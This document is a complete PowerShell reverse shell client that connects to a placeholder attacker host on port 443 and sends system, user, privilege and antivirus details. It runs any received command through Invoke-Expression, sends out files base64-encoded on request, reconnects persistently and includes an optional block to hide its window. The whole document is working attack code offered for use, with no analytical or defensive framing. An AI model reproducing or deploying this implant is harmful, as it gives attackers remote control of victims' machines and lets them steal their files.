# Windows Reverse Shell Client
# Requires PowerShell 5.1 or higher

# Script configuration
$Global:ServerIP = "<DEATHSTAR_IP>"
$Global:ServerPort = 443
$Global:ReconnectDelay = 5

function Test-Administrator {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-WindowsPrivileges {
    try {
        $privileges = whoami /priv | Where-Object { $_ -match "Enabled" }
        return ($privileges -join "`n")
    } catch {
        return "Failed to get privileges: $_"
    }
}

function Get-SystemDetails {
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $cpu = Get-WmiObject -Class Win32_Processor
    $av = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct

    $sysinfo = @"
=== System Information ===
OS: $($os.Caption) $($os.Version)
Architecture: $($env:PROCESSOR_ARCHITECTURE)
Computer: $($env:COMPUTERNAME)
Domain: $($env:USERDOMAIN)
Username: $($env:USERNAME)
Admin Rights: $(Test-Administrator)
CPU: $($cpu.Name)
Antivirus: $($av.displayName)
"@
    return $sysinfo
}

function Get-FileContent {
    param([string]$filepath)
    
    try {
        Write-Host "[*] Reading file: $filepath"
        $bytes = [System.IO.File]::ReadAllBytes($filepath)
        $encoded = [Convert]::ToBase64String($bytes)
        Write-Host "[*] File read successfully, size: $($bytes.Length) bytes"
        return $encoded
    } catch {
        Write-Host "[!] Error reading file: $_"
        return "ERROR: $_"
    }
}

function Invoke-PowerShellCommand {
    param([string]$command)
    
    try {
        $output = Invoke-Expression -Command $command | Out-String
        if ([string]::IsNullOrEmpty($output)) {
            return "Command executed successfully (no output)"
        }
        return $output
    } catch {
        return "Error executing command: $_"
    }
}

function Start-Client {
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($ServerIP, $ServerPort)
            
            Write-Host "[+] Connected to server"
            
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            
            # Send initial system information
            $initialInfo = Get-SystemDetails
            $writer.WriteLine($initialInfo)
            $writer.Flush()
            
            while ($client.Connected) {
                $command = $reader.ReadLine()
                
                if ([string]::IsNullOrEmpty($command)) { continue }
                
                Write-Host "[*] Received command: $command"
                
                $output = switch -Regex ($command) {
                    "^die$" {
                        $client.Close()
                        exit
                    }
                    "^getfile:(.*)" {
                        $filepath = $matches[1]
                        Get-FileContent -filepath $filepath
                    }
                    "^sysinfo$" {
                        Get-SystemDetails
                    }
                    "^privileges$" {
                        Get-WindowsPrivileges
                    }
                    "^whoami$" {
                        "$env:USERDOMAIN\$env:USERNAME"
                    }
                    default {
                        Invoke-PowerShellCommand -command $command
                    }
                }
                
                if ($output) {
                    $writer.WriteLine($output)
                    $writer.Flush()
                }
            }
            
        } catch {
            Write-Host "[-] Connection failed: $_"
        } finally {
            if ($client -ne $null) {
                $client.Close()
            }
            if ($writer -ne $null) {
                $writer.Close()
            }
            if ($reader -ne $null) {
                $reader.Close()
            }
        }
        
        Write-Host "[*] Attempting to reconnect in $ReconnectDelay seconds..."
        Start-Sleep -Seconds $ReconnectDelay
    }
}

# Optional: Hide the PowerShell window
# Add-Type -Name Window -Namespace Console -MemberDefinition '
# [DllImport("Kernel32.dll")] 
# public static extern IntPtr GetConsoleWindow();
# [DllImport("user32.dll")]
# public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
# '
# $consolePtr = [Console.Window]::GetConsoleWindow()
# [Console.Window]::ShowWindow($consolePtr, 0)

# Start the client
Start-Client
